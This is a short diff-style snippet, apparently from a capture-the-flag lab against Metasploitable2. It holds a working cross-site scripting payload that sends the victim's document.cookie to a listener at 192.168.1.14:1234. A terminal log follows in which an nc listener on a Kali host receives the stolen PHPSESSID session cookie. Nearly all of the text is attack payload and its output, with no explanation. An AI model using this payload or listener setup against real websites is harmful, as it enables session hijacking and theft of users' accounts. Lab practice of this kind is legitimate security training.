@@ -1,0 +1,15 @@
+<script>  image = new Image(); image.src="http://192.168.1.14:1234/?c="+document.cookie;   </script>
+
+hack@kali:~/CTF/Metasploitable2$ nc -lnvp 1234
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.14.
+Ncat: Connection from 192.168.1.14:50572.
+GET /?c=PHPSESSID=15043fc84a30941f07cdbc42e45326e7 HTTP/1.1
+Host: 192.168.1.14:1234
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.14
